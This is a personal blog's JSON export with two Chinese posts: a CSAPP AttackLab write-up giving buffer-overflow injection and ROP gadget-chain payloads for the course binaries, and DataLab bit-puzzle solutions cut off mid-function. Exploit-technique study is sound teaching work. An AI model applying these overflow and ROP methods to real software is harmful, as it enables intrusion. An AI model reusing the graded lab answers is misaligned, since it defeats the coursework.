{"meta":{"title":"wwow's blog","subtitle":"","description":"努力可能会成功，但不努力真的很舒服","author":"wwow","url":"http://yoursite.com","root":"/"},"pages":[{"title":"tags","date":"2020-08-29T16:09:37.000Z","updated":"2020-08-29T16:11:33.879Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"layout: tags comments: false"},{"title":"categories","date":"2020-08-29T16:11:57.000Z","updated":"2020-08-30T04:02:15.813Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"csapp-attackLab","slug":"csapp-attackLab","date":"2020-09-04T08:22:49.000Z","updated":"2020-09-04T14:03:23.319Z","comments":true,"path":"2020/09/04/csapp-attackLab/","link":"","permalink":"http://yoursite.com/2020/09/04/csapp-attackLab/","excerpt":"","text":"CSAPP-AttackLabGDB简要指南:http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf AttackLab-writeup:http://csapp.cs.cmu.edu/3e/attacklab.pdf （建议在实验开始前认真看writeup，writeup上会告诉你每个题目的具体要求并且提供一些提示） 本次实验的任务是利用缓冲区溢出来制造5次不同的攻击。 攻击主要分为两种类型： code-injection（代码注入）：即将你的代码注入到栈中，并利用跳转语句使你注入的代码被执行。 return-oriented-programming（面向返回值编程？）：当系统将栈空间的数据定义为不可执行的，那么我们就无法执行注入的代码，这时候可以查看系统已有的代码，并且将它们“断章取义”，作为我们攻击代码的一部分。 前三次攻击使用code-injection，后两次使用return-oriented-programming 压缩包中提供了两个可执行程序，分别为rtarget和ctarget，rtarget对应code-injection攻击，ctarget对应return-oriented-programming攻击（ROP）。 通过使用objdump将这两个可执行程序反汇编，我们可以得到它们的汇编代码。 这两个程序中都会调用Gets函数（书中分析过它是不安全的，可能导致缓冲区溢出），要求输入一个字符串，我们可以利用这个输入的字符串以及缓冲区溢出来组织一次攻击。 注意：输入的字符串不应该包含0x0a数值（对应ascii码为’\\n’) 同时压缩包提供了另外一个工具——HEX2RAW，程序输入为一连串以空格分开的两位十六进制数的字符串，程序输出为相应字节码。默认数据以小端方式存放，例如输入“ef be ad be”实际上得到的值为0xdeadbeef。 每一个用户的压缩包都有一个独特的cookie值，这在题目中会用到。 ctarget和rtarget时可以使用以下参数： -q：self-study必选参数，避免程序寻找教师的服务器 -i FILE：从文件读取输入，而非从标准输入 Part1（ctargt）：Code Injection Attackspart1部分的所有内容都使用ctarget文件，使用的攻击类型为代码注入。 part1部分既没有使用金丝雀值也没有使用栈随机化，可以利用这两点构建攻击代码。 Level 1在第一个阶段，我们无需注入新的代码，而是需要利用输入的字符串将程序的PC指针重定向到touch1函数中，转而执行touch1函数。 writeup中提示我们使用将函数地址压栈然后调用ret的方式来重定向程序 首先，通过objdump反汇编ctarget 找到输入函数getbuf，我们需要查看目前栈的使用情况。 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 可以看到程序为输入的字符串准备了0x28–&gt;40个字节的存储空间。 所以为了实现缓冲区溢出，我们首先使用一些无效字符填满这40个字节，在这40个字节之后就是getbuf的返回地址（正常情况下返回到test函数），我们需要使用touch1函数的入口地址来替换getbuf的返回地址。 查看touch1的入口地址 100000000004017c0 &lt;touch1&gt;: 将touch1的入口地址转换为小端排列，得到c0 17 40 00 00 00 00 00 那么第一阶段的答案为： 1234561 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00 00 00 00 00 前40个字节任意，最后8个字节为touch1的入口地址。 使用hex2raw转换后作为ctarget的输入 执行结果如下： 123456789root:~/csappLab3/target1# ./hex2raw &lt; ctargetl1.txt | ./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00 00 00 00 00 Level 2第二个阶段，我们需要将程序的PC重定向到touch2函数上，并且还需要将cookie作为参数传递给touch2 首先查看一下自己的cookie和touch2的入口地址 12;my cookie：0x59b997fa00000000004017ec &lt;touch2&gt;: ;touch2入口 函数的第一个参数存放在寄存器%rdi 为了达到以上目的，我们需要执行以下汇编代码 123mov $0x59b997fa,%rdipushq $0x4017ecretq 使用gcc和objdump（gcc得到这段汇编代码的可执行文件，再用objdump反汇编）得到这段汇编代码对应的机器码 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq ~ 这段汇编代码对应的字节码为”48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3”。 那么如何执行我们传入的代码呢？ 可以发现在Part1部分，没有采用栈随机化技术，程序中栈的地址是固定的，所以我们可以计算出我们输入的数据存放的内存地址，然后将PC指针重定向到我们注入的代码处即可。 我在自己的机器上进行gdb调试后得到在getbuf程序中，执行完sub $0x28,%rsp后，%rsp=0x5561dc78。 综上所述，得到第二阶段的答案： 123456;地址0x5561dc7848 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 在执行getbuf读取输入数据后，利用缓冲区溢出，利用0x5561dc78来替换getbuf函数的返回地址，这样在执行完getbuf后，程序跳转到0x5561dc78处，执行我们输入的代码。 执行结果如下： 123456789root:~/csappLab3/target1# ./hex2raw &lt; ctargetl2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level 3第三个阶段同样要求注入一段攻击代码，这一次我们需要将程序的PC重定向到touch3上，并且以字符串形式传递cookie。 touch3函数调用hexmatch函数来比较cookie是否正确。 将cookie（0x59b997fa)转换为字符串”59b997fa”，在将字符串转换为字节码形式”35 3962 39 39 37 66 61”。 writeup中提示hexmatch和strncmp会将新的数据压入栈中，为了防止输入的字符串cookie被新的数据覆盖，所以把字符串cookie藏在返回地址后面。 level2中提到，在执行getbuf输入数据时，第一个数据放在0x5561dc78处，那么返回地址就存放在0x5561dca0，返回地址占8个字节，所以字符串起始地址应该在0x5561dca8。 需要将字符串的首地址（0x5561dca8）存放到%rdi中，作为参数传递给touch3。 同样的，首先确定注入的汇编代码 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 汇编代码对应的字节码为”48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3”。 另外，和第二阶段一样，需要将getbuf的返回地址替换为我们输入的代码的首地址，即0x5561dc78。 则综上所述，得到第三阶段的答案为： 12345648 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 执行结果如下： 123456789root:~/csappLab3/target1# ./hex2raw &lt; ctargetl3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 Part2：ROPpart2的所有内容都使用rtarget文件，使用的攻击类型为ROP。 part2部分使用了栈随机化技术，使得程序在每一次运行时它的栈的地址都是变化的，所以我们无法确定我们输入的代码段的起始地址，也就无法执行注入的代码。 另一方面，part2中将栈的地址空间定义为不可执行的，即无法执行存放在栈中的代码。 以上两种限制导致代码注入的方式变得不可行，我们需要采用一种新的方式，即我们不注入新的代码，而是利用系统中已有的代码，截取代码的一部分来执行。 例如指令 movl $0x78948d4，(%rdi)的机器码为c7 07 d4 48 89 c7 截取其中48 89 c7，对应汇编代码为movq %rax，%rdi 下面各表为不同汇编指令的机器码。 补充一个0x90—&gt;no op Level 2在第四个阶段，我们的任务和第二个阶段一样，将程序的PC重定向到touch2，并且传递cookie作为函数参数。不同的地方在于我们要使用rtarget文件。 我们能够“借用”的代码为，从start_farm到mid_farm之间的所有代码。 通过objdump查看可用的汇编指令的机器码，对它们“断章取义”，再“为我所用”。 首先我们要将cookie传送到%rdi中，由于我们输入的cookie数据在栈中，要将其传送到通用寄存器中，首先需要寻找合适的popq指令。 根据表中的popq机器码，搜索反汇编的rtarget.s文件（根据提示，查找范围在start_farm到mid_farm之间），查看是否有合适的机器码可以被截取使用 找到addval_219 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 截取其中的58 90 c3，对应汇编指令如下： 123popq %raxno opretq 然后需要找到将数据从%rax传送到%rdi的方法。 搜索后得到setval_426满足要求 123456700000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq ;截取48 89 c7 90 c3 ;mov %rax,%rdi ;noop ;ret 至此，就完成了cookie传输到%rdi的任务，之后只要跳转到touch2函数即可。 touch2的起始地址为0x4017ec 综上所述，得到第四阶段的答案为： 1234567861 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 61ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 0000 00 00 00 ec 17 40 00 00 0000 00 在输入这段字符串后，程序首先会返回到0x4019ab处，执行popq %rax，这时存储在栈上的cookie(0x59b997fa)被出栈到%rax。 然后返回到0x4019c5处执行mov %rdi,%rax，将cookie从%rax复制到%rdi。 最后返回到touch2. 执行结果如下： 123456789root:~/csappLab3/target1# ./hex2raw &lt; rtargetl1.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 Level3第五个阶段，我们能够“借用”从start_farm到end_farm的所有代码 这一部分涉及到一些特别的指令，它们不改变任何的寄存器数据以及内存单元，例如”andb %al,%al”。说明这一点的目的是因为，我们借用代码时，可能引入一些多余的机器码，我们需要区分哪些多余的机器码会影响我们的行为，而哪些不会造成影响。 这一阶段我们的任务和第三阶段一样，即将cookie转换为字符串后，将其作为参数传入touch3执行。 由于不知道栈的内存地址，所以我们也无法指导传入的字符串cookie在哪 那么就需要通过当前栈顶地址+偏移量，对我们传入的cookie进行相对寻址 可以发现writeup中提供的机器码中没有关于相加的汇编指令 但是看一看反汇编的rtarget.s，找到add_xy： 12300000000004019d6 &lt;add_xy&gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 发现了lea！！！，这条指令可以将%rdi的值与%rsi相加并存放到%rax中。 那么我们的思路就很清晰了，将栈顶地址（特指getbuf的返回地址存放位置）和栈顶到字符串cookie的偏移量分别存放到%rdi和%rsi中，再执行mov %rdi，%rax就完成参数传递了。 首先找到mov %xxx,%rsp将栈顶地址传出 找到addval_190: 1234560000000000401a03 &lt;addval_190&gt;: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq ;取出48 89 e0 c3----&gt; ;movq %rsp,%rax ;ret 再找到setval_426，将%rax的数据传递给%rdi 123456700000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq ;取出48 89 c7 90 c3----&gt; ;movq %rax,%rdi ;noop ;ret 这样就成功将栈顶地址传递到%rdi 然后需要将字符串cookie的偏移量传递到%rsi，由于cookie属于数据，而不是指令，所以与其他的指令需要分隔开放到最后。由于我们不知道还需要输入多少条指令，所以cookie的偏移量还无法确定，所以暂定为xx。 将偏移量xx出栈到%rax 123456700000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq ;取出58 90 c3---&gt; ;popq %rax ;noop ;ret 再将偏移量xx从%eax传递给%edx 12345670000000000401a40 &lt;addval_487&gt;: 401a40: 8d 87 89 c2 84 c0 lea -0x3f7b3d77(%rdi),%eax 401a46: c3 retq ;取出89 c2 84 c0 c3----&gt; ;movl %eax,%edx ;cmpb %cl,%cl(无意义，不影响) ;ret 再将偏移量xx从%edx传到%ecx 12345670000000000401a33 &lt;getval_159&gt;: 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq ;取出89 d1 38 c9 c3-----&gt; ;movl %edx,%ecx ;cmpb %cl,%cl(无意义，不影响) ;ret 再将偏移量xx从%ecx传递给%esi 12345670000000000401a25 &lt;addval_187&gt;: 401a25: 8d 87 89 ce 38 c0 lea -0x3fc73177(%rdi),%eax 401a2b: c3 retq ;取出89 ce 38 c0 c3----&gt; ;movl %ecx,%esi ;cmpb %al,%al(无意义，不影响) ;ret 成功将偏移量xx和栈顶地址都传递到了%rsi和%rdi 任何跳转执行add_xy，计算字符串cookie的首地址并存放到%rax 将字符串cookie的首地址从%rax传递到%rdi: 12345600000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq ;取出48 89 c7 c3----&gt; ;movq %rax,%rdi ;ret 至此参数传递完成 最后在栈中存放一个touch3的函数入口地址用于程序跳转。 综上所属，第五阶段的答案为：(；之后的内容为注释，不是答案主体) 12345678910111213141561 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 6161 61 61 61 61 61 61 61 61 61 ;----&gt;填满缓冲区06 1a 40 00 00 00 00 00 ;----&gt;movq %rsp,%rax（此处为“栈顶”）c5 19 40 00 00 00 00 00 ;----&gt;mov %rax,%rdicc 19 40 00 00 00 00 00 ;popq %rax48 00 00 00 00 00 00 00 ;从栈顶到cookie的偏移量42 1a 40 00 00 00 00 00 ;movl %eax,%edx34 1a 40 00 00 00 00 00 ;mov %edx,%ecx27 1a 40 00 00 00 00 00 ;mov %ecx,%esid6 19 40 00 00 00 00 00 ;lea (%rdi,%rsi,1),%raxc5 19 40 00 00 00 00 00 ;movq %rax,%rdifa 18 40 00 00 00 00 00 ;touch3地址35 39 62 39 39 37 66 61 ;字符串cookie 执行结果如下： 123456789root:~/csappLab3/target1# ./hex2raw &lt; rtargetl2.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 至此，attackLab就全部结束了，我个人认为这个实验的内容非常有趣，通过利用栈溢出来展开不同的攻击，并且在实验过程中进一步地巩固了对于栈以及字节序的知识。前面四个阶段的内容难度都比较适中，但是最后一个实验却很难，主要原因在于我先入为主的以为ROP使用的全部代码都需要“截取”得到，却没想到lea是一个完整现成的可用模块，在这一点上耗费了大量的时间。","categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"}],"tags":[]},{"title":"csapp-dateLab","slug":"csapp-dateLab","date":"2020-09-03T08:08:50.000Z","updated":"2020-09-04T08:50:24.145Z","comments":true,"path":"2020/09/03/csapp-dateLab/","link":"","permalink":"http://yoursite.com/2020/09/03/csapp-dateLab/","excerpt":"","text":"CSAPP-DateLabDateLab是csapp的第一个课程实验，从csapp的官网上下载实验的压缩包。 我们需要填写代码压缩包中的bits.c文件 本次实验通过C语言完成，但是对于C语言某些特性和操作符的使用有严格限制(基本只能使用位运算)。 具体要求如下： 1234567891011121314151617181920//expr可以由以下元素构成://0~255的int常量//函数参数和局部变量//！ ~// &amp; ^ | + &lt;&lt; &gt;&gt;//不能做的事://使用if,do,while,for,switch等控制语句//定义和使用宏//定义额外的函数//调用函数//使用其他运算符，例如&amp;&amp; || -,or ?//使用强制类型转换//使用除了int外的其他数据类型(例如数组，结构和联合)//可以提供的前提条件：//int为32位且由补码表示//右移为算术右移//当移位数小于0或大于31时，会出现不可预测的情况 以上要求是在所有函数中都必须遵守的，但是不同的函数中会有更多的限制。 在测试前先使用压缩包中的dlc程序来检测你的代码是否打破了上述规则 每个函数上部有具体的操作限制： ​ legal ops–&gt;允许使用的操作符 ​ Max ops—&gt;函数中允许使用的操作符数量上限 bitXor12345678910111213141516/* bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */ //int bitXor(int x, int y) &#123; //tl将在x中为0,在y中为1的位置为1 //tl将在x中为1,在x中为0的位置为1 //~tl &amp; ~tr 将所有在tl和tr中都为0的位置为1,可以将它看作~(tl|tr) int tl=~x&amp;y; int tr=~y&amp;x; int ans=~(~tl &amp; ~tr); return ans;&#125; tmin1234567891011/* * tmin - return minimum two&#x27;s complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 *///返回二进制补码的最小值int tmin(void) &#123; int ans=0x1&lt;&lt;31; return ans;&#125; isTmax12345678910111213141516/* * isTmax - returns 1 if x is the maximum, two&#x27;s complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 *///如果x是最大的二进制补码则返回1int isTmax(int x) &#123; //想了非常多的办法，但是仍然无法区分0x7FFFFFFF和0xFFFFFFFF(心累... //将等式分成两个部分 ~(x+x+1) 和 !(x+1) //要返回1 则有两种组合 ~(x+x+1)=-1,!(x+1)=1,或者是 ~(x+x+1)=!(x+1)=0 //讨论第一种组合，要使！(x+1)=1 则x=0xFFFFFFFF,代入~(x+x+1)=0,所以不存在数x能够满足第一种组合 //讨论第二种组合，要使~(x+x+1)=0,x=0xFFFFFFFF或0x7FFFFFFF, 而要同时满足!(x+1)=0则只有x=0x7FFFFFFF return !(~(x+x+1)+!(x+1));&#125; allOddBits123456789101112131415161718/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 *///x的偶数位如果全为1则返回1，反之返回0int allOddBits(int x) &#123; //让x和0xAAAAAAAA想与后减去0xAAAAAAAA,若结果为0则正确，反之错误 int tst=0xAA; int base=0xAA; tst=(tst&lt;&lt;8)+base; tst=(tst&lt;&lt;8)+base; tst=(tst&lt;&lt;8)+base; return !((x&amp;tst)+(~tst+1));&#125; negate123456789 * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1;&#125; isAsciiDigit12345678910111213141516171819202122232425//3/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 *///如果x在0x30和0x39之间则返回1，反之返回0int isAsciiDigit(int x) &#123; //先拆分高位的3进行确认，然后查看低位 //当低位0~7时，有lres=0,llf≠0 //低位8~9时，lres≠0，llf=0 (ltmp=0--&gt; lres=0) //低位A~F时，lres≠0,llf≠0,且lres&amp;llf≠0, 这时lres=6,最终llf=2或4或6 int high=x&gt;&gt;4; int low=x&amp;0xF; int hres=high^3; int ltmp=low&amp;8; int lres=(ltmp&gt;&gt;1)+(ltmp&gt;&gt;2); int llf=(low+(~8+1))&amp;0xE; return !(hres | (lres&amp;llf));&#125; conditional123456789101112131415/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 *///实现条件表达式x?y:zint conditional(int x, int y, int z) &#123; //x=0--&gt;return z x≠0--&gt;return y int ans=0; ans=ans+((~(!x+(~0)))&amp;z); //当x=0 ans+=z 当x≠0 ans+=0 ans=ans+((!x+(~0))&amp;y); //当x=0 ans+=y 当x≠0 ans+=0 return ans;&#125; isLessOrEqual1234567891011121314151617181920212223 * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */ //实现if x &lt;= y then return 1, else return 0 int isLessOrEqual(int x, int y) &#123; //直接做减法会出现溢出导致错误 //将异号的情况先单独讨论，再对同号的情况使用减法判断大小 int ls=~((x&amp;(~y))&gt;&gt;31)+1; //x&lt;0 y&gt;=0 ls=1 否则ls=0 int gt=!((y&amp;(~x))&gt;&gt;31); //x&gt;=0 y&lt;0 gt=0 否则gt=1 //可以看到 当x,y异号时, ls==gt ,同号时ls^gt=1,这一特点会在最后一步使用到 int Tmin=~(1&lt;&lt;31); int tmpx=x&amp;Tmin; int tmpy=y&amp;Tmin; int cmp=~((tmpy+(~tmpx+1))&gt;&gt;31); //先除去符号位做减法比较大小, //然后根据符号位反转结果，只有在x,y同号时才考虑cmp，其他情况它会被忽略 int ans=(ls&amp;gt)+((ls^gt)&amp;cmp); return ans;&#125; logicalNeg123456789101112131415/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */// 实现!操作符int logicalNeg(int x) &#123; //除0外的数全部弄成负数然后右移31位,最后+1 //利用-0=0的特点 int ans=((x|(~x+1))&gt;&gt;31)+1; //x=0 ans--&gt;1 其他ans=0 return ans;&#125; howManyBits12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/* howManyBits - return the minimum number of bits required to represent x in * two&#x27;s complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 0000 0005 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 *///最多需要多少位才能表示xint howManyBits(int x) &#123; //对负数取反，正数不变，此时从左到右第一个1的下标+1就是答案 //先将x变为 000..001xx..xx的形式(x可以是0也可以是1) int top=(1&lt;&lt;31)&amp;x; //取x最高位 //将x变为000..00111..1的形式， int tmp; int cur=0; int ans=16; int tst=1&lt;&lt;15; int stm2; int stm1; x=x^(top&gt;&gt;31); tmp=x&gt;&gt;1; x=x|tmp;//2 tmp=x&gt;&gt;2; x=x|tmp; //4 tmp=x&gt;&gt;4; x=x|tmp; //8 tmp=x&gt;&gt;8; x=x|tmp; //16 tmp=x&gt;&gt;16; x=x|tmp; //32 //二分法找到最右侧的0的下标 cur=tst&amp;x; //根据cur决定左移还是右移 stm1=(!cur)+(~1)+1; stm2=~stm1; tst=tst&lt;&lt;(stm1&amp;8); tst=tst&gt;&gt;(stm2&amp;8); ans=ans+(stm1&amp;8); ans=ans+(stm2&amp;(~8+1)); cur=tst&amp;x; stm1=(!cur)+(~1)+1; stm2=~stm1; tst=tst&lt;&lt;(stm1&amp;4); tst=tst&gt;&gt;(stm2&amp;4); ans=ans+(stm1&amp;4); ans=ans+(stm2&amp;(~4+1)); cur=tst&amp;x; stm1=(!cur)+(~1)+1; stm2=~stm1; tst=tst&lt;&lt;(stm1&amp;2); tst=tst&gt;&gt;(stm2&amp;2); ans=ans+(stm1&amp;2); ans=ans+(stm2&amp;(~2+1)); cur=tst&amp;x; stm1=(!cur)+(~1)+1; stm2=~stm1; tst=tst&lt;&lt;(stm1&amp;1); tst=tst&gt;&gt;(stm2&amp;1); ans=ans+(stm1&amp;1); ans=ans+(stm2&amp;(~1+1)); //注意最后一次不能漏,参考样例0x80000000就可以明白为什么需要加这一次 cur=tst&amp;x; stm1=(!cur)+(~1)+1; ans=ans+(stm1&amp;1); return ans;&#125; 后续的函数全部涉及到浮点数的操作，所以限制规则也发生的改变，变得更加宽松 浮点数规则： 1234567891011121314151617// 浮点数规则://可以使用://循环和条件控制语句//可以使用int和unsigned类型//使用任意的int或unsigned常量//可以使用基于int或unsigned的任何算术，逻辑，比较运算//不能使用://定义和使用宏//定义和调用函数//强制类型转换//使用int和unsigned外的其他数据类型//使用任何浮点数据类型，操作符和常量//dlc不仅会检查你的代码是否符合以上标准//还会更进一步检查你使用的各种运算符的数量是否超出上限(=不会被计数，它可以被任意使用)//运算符使用上限会在每个函数上方给出 floatScale2123456789101112131415161718192021222324252627282930313233343536/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int&#x27;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 *///结果要求返回浮点数结果2*f，如果参数是NaN，直接返回参数//所有输入和返回的参数都使用unsigned类型表示，但是我们应该将它看作是浮点类型//uf就是浮点数funsigned floatScale2(unsigned uf) &#123; //如果是NaN或无限大，直接返回参数 unsigned tmp=uf&amp;0x7F800000u; unsigned checkNaN=tmp^0x7F800000u; unsigned ans; unsigned norm=tmp; if(!checkNaN || !uf)&#123; return uf; &#125; //非规格化数左移一位 if(!norm)&#123; tmp=uf&lt;&lt;1; ans=(uf&amp;0x80000000u)+(tmp&amp;0x7FFFFFFFu); return ans; &#125; else&#123; //规格化数对阶码+1 tmp=uf+0x00800000u; ans=(uf&amp;0x807FFFFFu)+(tmp&amp;0x7F800000u); return ans; &#125;&#125; floatFloat2Int12345678910111213141516171819202122232425262728293031323334353637383940/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 *///将浮点数f转换为int返回，超出表示返回的浮点数都转换为0x80000000uint floatFloat2Int(unsigned uf) &#123; //127次方最多,-126次方最少 //通过阶码先区分出越界的数 unsigned tmp=uf&amp;0x7F800000; unsigned checkNaN=tmp^0x7F800000u; int ans; int M; int mov; if(!checkNaN) //无限大和NaN return 0x80000000u; ////阶码大于等于127+31的数溢出，实际上0xCF000000是不会溢出的，但是它的转换结果就是0x80000000 if(tmp&gt;=0x4F000000) return 0x80000000u; else if(tmp&lt;0x3F80000) //阶码小于127，则可以直接返回0，因为int无法表示那么小的数(非常接近0的小数) return 0; else&#123; ans=0; M=uf&amp;0x007FFFFF; mov=tmp&gt;&gt;23; if(tmp&lt;0x4B000000) //当阶码小于(127+23),则需要将尾数M右移，反之左移 ans=ans+((M+0x00800000)&gt;&gt;(150-mov)); else //阶码大于等于(127+23),需要将位数左移 ans=ans+((M+0x00800000)&lt;&lt;(mov-150)); if(uf&gt;&gt;31) //前面都是默认正数情况，如果符号位为1需要将结果转为负数 ans=~ans+1; return ans; &#125;&#125; floatPower2123456789101112131415161718192021222324252627282930313233/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 *///返回2^x数的浮点数形式//如果数值过小无法表示则返回0，如果数值过大返回+INFunsigned floatPower2(int x) &#123; unsigned ans=0; if(!x) return 0x3f800000; if(x&gt;127) //超出表达范围 